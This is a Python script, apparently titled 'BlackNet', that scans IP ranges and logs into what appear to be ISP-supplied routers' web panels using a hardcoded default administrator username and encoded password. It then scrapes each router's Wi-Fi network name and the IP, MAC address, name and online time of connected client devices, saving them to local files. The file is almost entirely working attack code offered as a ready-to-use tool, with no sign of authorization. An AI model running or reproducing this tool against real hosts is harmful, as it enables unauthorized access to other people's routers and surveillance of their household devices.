import argparse 
import requests
import re
import os
import time, sys
from urllib.parse import urlparse
from queue import Queue
import threading, ipaddress

def color_text(text, color='white'):
    colors = {
        'red': '\033[31m',      # Vermelho
        'green': '\033[32m',    # Verde neon
        'yellow': '\033[33m',   # Amarelo neon
        'blue': '\033[34m',     # Azul neon
        'magenta': '\033[35m',  # Magenta
        'cyan': '\033[36m',     # Ciano neon
        'white': '\033[37m',    # Branco
        'reset': '\033[0m'      # Resetar cor
    }
    return f"{colors.get(color, colors['white'])}{text}{colors['reset']}"

def banner_text():
    banner = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⡶⣶⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡾⠛⠉⢠⣶⣿⣿⣶⣄⠉⠛⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⠋⠀⠀⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠙⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢣⣴⣶⣶⣦⡹⢿⣿⣿⡿⢏⣴⣶⣶⣦⡜⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⣿⣿⣿⣿⣿⣿⠀⣿⡿⠀⣿⣿⣿⣿⣿⣿⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠻⣿⣿⣿⣿⣿⡀⣽⣿⢀⣽⣿⣿⣿⣿⠟⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠈⠉⠉⠉⠻⣿⣿⣿⣾⠟⠁⠉⠉⠁⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠀⠈⣿⣿⠁⠀⠀⠀⠀⢀⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣦⣄⠀⠀⠀⣽⣷⠀⠀⠀⣠⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⢷⣶⣾⣷⣶⡶⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣀⡀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⣀⣀⡀⠀⢀⣀⡀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀
⣴⣿⠟⠛⢿⣦⡀⣿⡟⠛⠛⠛⣿⣷⣰⣿⠟⠛⢿⣷⡄⢠⣠⣤⡻⠻⠗⠀⣴⣿⠟⠛⢿⣦⣸⣿⣧⣾⡿⢛⣿⡿⠟⠻⣿⣦⠀
⣿⡇⠀⠀⠀⣿⡇⣿⣷⣄⡀⠀⠉⠁⣿⣇⠀⠀⠀⣿⡇⣀⡉⠻⢿⣶⣄⡰⣿⣇⠀⠀⠀⣿⡿⣿⣿⣅⡀⢸⣿⡀⠀⠀⢸⣿⠀
⠙⠿⣷⣶⣦⣿⡇⠛⠋⠛⢿⣷⣤⡀⠙⠿⣷⣶⡦⣿⡇⢿⣷⣶⣶⣿⣿⣿⠙⠿⣷⣶⡆⣿⡟⠛⠋⠻⢿⣶⣿⣿⣷⣶⣼⣿⡁
"""

    return color_text(banner, 'green') + '\n' + color_text(" ", 'white')

def cls():
    if os.name == "nt":  # Windows
        os.system("cls")
    else:  # Linux ou macOS
        os.system("clear")
        
def start():
    cls()
    print(banner_text())

# Função de log
def log(action, host, method, url, headers=None, data=None, cookies=None):
    """Função de log detalhado para cada requisição"""
    if args.log:  # Verifica se o log está ativado
        print(f"\n{color_text('[LOG]', 'cyan')} {action} para {color_text(host, 'yellow')} com método {method}")
        print(f"{color_text('[LOG]', 'cyan')} URL: {url}")
        if headers:
            print(f"{color_text('[LOG]', 'cyan')} Cabeçalhos: {headers}")
        if data:
            print(f"{color_text('[LOG]', 'cyan')} Dados: {data}")
        if cookies:
            print(f"{color_text('[LOG]', 'cyan')} Cookies: {cookies}")

# Função para obter token
def get_token(host, protocol):
    url = f"{protocol}://{host}:80/asp/GetRandCount.asp"
    headers_token = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'{protocol}://{host}',
        'Referer': f'{protocol}://{host}/',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8',
    }
    log("Obtendo token", host, "POST", url, headers=headers_token)
    try:
        response = requests.post(url, headers=headers_token, verify=False)
        response.raise_for_status()
        token = response.content.decode('utf-8-sig').strip()
        print(f"{color_text('[•]', 'cyan')}", end="")
        print(f' Token obtido: {color_text(token, "yellow")}')
        return token
    except requests.exceptions.RequestException as e:
        print(f"[Erro] Falha ao obter token: {e}")
        return None

def login(host, token, protocol):
    url = f"{protocol}://{host}:80/login.cgi"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': f'{protocol}://{host}',
        'Referer': f'{protocol}://{host}/',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8',
    }
    cookies = {'Cookie': 'body:Language:english:id=-1'}
    data = {
        'UserName': 'telecomadmin',
        'PassWord': 'YWRtaW50ZWxlY29t',
        'x.X_HW_Token': token
    }
    log("Realizando login", host, "POST", url, headers=headers, data=data, cookies=cookies)
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
        response.raise_for_status()
        print(f"{color_text('[•]', 'cyan')}", end="")
        print(f' Login realizado com sucesso! Código HTTP: {color_text(response.status_code, "yellow")}')
        response_cookies = response.cookies.get_dict()
        print(f"{color_text('[•]', 'cyan')}", end="")
        print(f' Cookies recebidos: {color_text(str(response_cookies), "yellow")}')
        return response_cookies
    except requests.exceptions.RequestException as e:
        print(f"[Erro] Falha ao realizar login: {e}")
        return None

def access_protected_page(host, cookies, protocol, router):
    wlaninfo_url = f'{protocol}://{host}:80/html/amp/common/wlan_list.asp'
    log("Acessando página protegida", host, "GET", wlaninfo_url, cookies=cookies)
    try:
        response = requests.get(wlaninfo_url, cookies=cookies, verify=False)
        response.raise_for_status()
        html_content = response.text
        script_pattern = r'var WlanInfo = new Array\(new stWlanInfo\(".*?",".*?","(.*?)",".*?",".*?",".*?"\),null\)'
        match = re.search(script_pattern, html_content)
        
        if match:
            wlan_name = match.group(1)
            decoded_wlan_name = wlan_name.replace(r'\x2d', '-').replace(r'\x5f', '_').replace(r'\x20', ' ')
            print(f"{color_text('[•]', 'cyan')}", end="")
            print(f' Nome da rede Wi-Fi em {color_text(host, "cyan")}: {color_text(decoded_wlan_name, "green")}')
            with open("hosts.txt", "a") as f:
                f.write(f"[i] Nome da rede Wi-Fi em {color_text(host, 'cyan')}: {color_text(decoded_wlan_name, 'green')}: {color_text(router, 'green')}\n")
            return host, wlan_name
        else:
            print(f"{color_text('[•]', 'cyan')}", end="")
            print(f' Erro ao encontrar o nome da rede em {color_text(host, "red")}')
            return 'error' 
    except requests.exceptions.RequestException as e:
        print(f"[Erro] Falha ao acessar página protegida: {e}")

def get_devices(host, cookies, protocol, name):
    url = f"{protocol}://{host}:80/html/bbsp/common/GetLanUserDevInfo.asp"
    try:
        response = requests.post(url, cookies=cookies, verify=False)
        html_content = response.text
        devices = []

        devices_raw = re.findall(r'new USERDevice\((.*?)\)', html_content, re.DOTALL)
        for device in devices_raw:
            fields = device.split(',')
            fields = [field.strip().strip('"') for field in fields]
            decoded_ip = decode_hex_string(fields[1])
            decoded_mac = decode_hex_string(fields[2])
            decoded_name = decode_hex_string(fields[9])
            decoded_status = decode_hex_string(fields[6])
            decoded_interface = decode_hex_string(fields[7])
            decoded_time_online = decode_hex_string(fields[8])

            devices.append({
                "IP": decoded_ip,
                "MAC": decoded_mac,
                "Nome": decoded_name,
                "Status": decoded_status,
                "Interface": decoded_interface,
                "Tempo Online": decoded_time_online,
            })

        unique_devices = {}
        for device in devices:
            unique_devices[device['IP']] = device 
        
        print('\n')
        print(f"{color_text('[•]', 'cyan')} {color_text('  Clientes Online:', 'yellow')}")
        print(f"{color_text('────────────────────────────────────────', 'cyan')}")
        devices_data = []
        import json
        for device in unique_devices.values():
            if device['Status'] == 'Online':
                status_color = 'green' if device['Status'] == 'Online' else 'red'
                print(f"{color_text('   ►', 'magenta')} {color_text('IP:', 'cyan')} {device['IP']} | "
                    f"{color_text('MAC:', 'magenta')} {device['MAC']} | "
                    f"{color_text('Nome:', 'blue')} {device['Nome']} | "
                    f"{color_text('Status:', status_color)} {device['Status']} | "
                    f"{color_text('Tempo Online:', 'yellow')} {device['Tempo Online']}")
                devices_data.append(device)
        print(f"{color_text('────────────────────────────────────────', 'cyan')}")
        if args.offline:
            print(f"{color_text('[•]', 'cyan')}", end="")
            print(" Clientes Offline:")
            for device in unique_devices.values():
                if device['Status'] != 'Online':
                    status_color = 'green' if device['Status'] == 'Online' else 'red'
                    print(f"{color_text('   ►', 'magenta')} {color_text('IP:', 'cyan')} {device['IP']} | "
                        f"{color_text('MAC:', 'magenta')} {device['MAC']} | "
                        f"{color_text('Nome:', 'blue')} {device['Nome']} | "
                        f"{color_text('Status:', status_color)} {device['Status']} | "
                        f"{color_text('Tempo Online:', 'yellow')} {device['Tempo Online']}")
                    devices_data.append(device)
            print(f"{color_text('────────────────────────────────────────', 'cyan')}")
            def sanitize_filename(filename):
                """Remove ou substitui caracteres inválidos no nome do arquivo."""
                return ''.join(c if c.isalnum() or c in ('_', '-') else '_' for c in filename)
            sanitized_name = sanitize_filename(name)    
        with open(f'hosts/{host}.json', 'w') as json_file:
            json.dump(devices_data, json_file, indent=4)
                
    except requests.exceptions.RequestException as e:
        print(f"[Erro] Falha ao obter dispositivos: {e}")
def decode_hex_string(hex_string):
    hex_pattern = r'\\x([0-9a-fA-F]{2})'
    decoded_string = re.sub(hex_pattern, lambda match: chr(int(match.group(1), 16)), hex_string)
    return decoded_string

def check(protocol, host):
    """Verifica o tipo de dispositivo com base no ProductName"""
    try:
        response = requests.get(f'{protocol}://{host}:80', verify=False, timeout=15)
        response.raise_for_status()
        html_content = response.text
        pattern = r"var ProductName\s*=\s*'([^']*)';"
        match = re.search(pattern, html_content)
        if match:
            product_name = match.group(1)
            print(f"{color_text('[•]', 'cyan')}", end="")
            print(f' ProductName em {protocol}://{host}:80: {product_name}')
            return product_name
        else:
            print(f'[i] Error: ProductName nao encontrado em {protocol}://{host}:80')
            return 'error'
    except requests.exceptions.RequestException as e:
        print(f"{color_text('[•]', 'red')}", end="")
        print(f" Erro ao verificar tipo de dispositivo: {e}")
        return 'error'
def ip_range(start_ip, end_ip):
    """Gera uma lista de IPs entre um IP inicial e final."""
    try:
        start = int(ipaddress.IPv4Address(start_ip))
        end = int(ipaddress.IPv4Address(end_ip))
        if start > end:
            raise ValueError("O IP inicial nao pode ser maior que o IP final.")
        return [str(ipaddress.IPv4Address(ip)) for ip in range(start, end + 1)]
    except ValueError as e:
        print(f"[!] Erro ao processar o intervalo de IPs: {e}")
        return []

def scan_ips(ip_range):
    """Gera uma lista de endereços IP a partir de uma faixa."""
    try:
        network = ipaddress.ip_network(ip_range, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError as e:
        print(f"[!] Erro no intervalo de IPs: {e}")
        return []
def process_host(protocol, host):
    try:
        result = check(protocol, host)
        
        token = get_token(host, protocol)
        if token:
                cookies = login(host, token, protocol)
                if cookies:
                    
                    wlan = access_protected_page(host, cookies, protocol, result)
                    if wlan != 'error':
                        if args.devices:
                            get_devices(host, cookies, protocol, wlan) 
                    else:
                        print ('[+] Erro {host}')
        else: 
            print(f"{color_text('[•]', 'red')}", end="")
            print(f' Aborting... ', end='')
            print(f"{color_text(host, 'red')}")
    except Exception as e:
        print(f"[!] Erro ao processar {host}: {e}")

def worker(protocol, queue):
    while not queue.empty():
        host = queue.get()
        process_host(protocol, host)
        queue.task_done()

def display_error():
    error_message = """
\033[91m[✘ ERRO]\033[0m Nenhum alvo especificado!
\033[93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
💡 \033[96mDica:\033[0m Especifique um alvo usando uma das opções abaixo:
    • \033[92m--target <host ou rede>\033[0m (ex.: 192.168.1.0/24)
    • \033[92m--start-ip <IP inicial> e --end-ip <IP final>\033[0m

🔧 \033[96mOutras opções disponíveis:\033[0m
    • \033[92m--devices\033[0m: Lista apenas dispositivos conectados (clientes).
    • \033[92m--offline\033[0m: Lista dispositivos online e offline.
    • \033[92m--log\033[0m: Ativa log detalhado das operações.
    • \033[92m--ssl\033[0m: Utiliza protocolo HTTPS (SSL) para requisições.

📚 \033[96mAjuda adicional:\033[0m
    • Use \033[92m--help\033[0m para exibir todas as opções e descrições completas.

\033[93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
"""
    print(error_message)
    sys.exit(1)

def main():
  
    if args.start_ip and args.end_ip: 
        hosts = ip_range(args.start_ip, args.end_ip)
    elif args.target:  
        if '/' in args.target:
            hosts = scan_ips(args.target)
        else:
            hosts = [args.target]
    else:
        display_error()
        return

    protocol = 'https' if args.ssl else 'http' 
    queue = Queue()

  
    for host in hosts:
        queue.put(host)

    threads = []
    num_threads = 15
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(protocol, queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BlackNet - Ferramenta de Reconhecimento e Monitoramento")
    parser.add_argument('--target', type=str, 
                        help="Especifique o endereço do host alvo ou rede (ex.: 192.168.1.0/24).")
    parser.add_argument('--start-ip', type=str, help="Especifique o IP inicial para o intervalo.")
    parser.add_argument('--end-ip', type=str, help="Especifique o IP final para o intervalo.")
    parser.add_argument('--devices', action='store_true', help="Listar apenas clientes.")
    parser.add_argument('--offline', action='store_true', help="Listar clientes online e offline.")
    parser.add_argument('--log', action='store_true', help="Ativar log detalhado.")
    parser.add_argument('--ssl', action='store_true', help="Usar SSL (HTTPS) para requisições.")

    args = parser.parse_args()
    start()  
    main() 
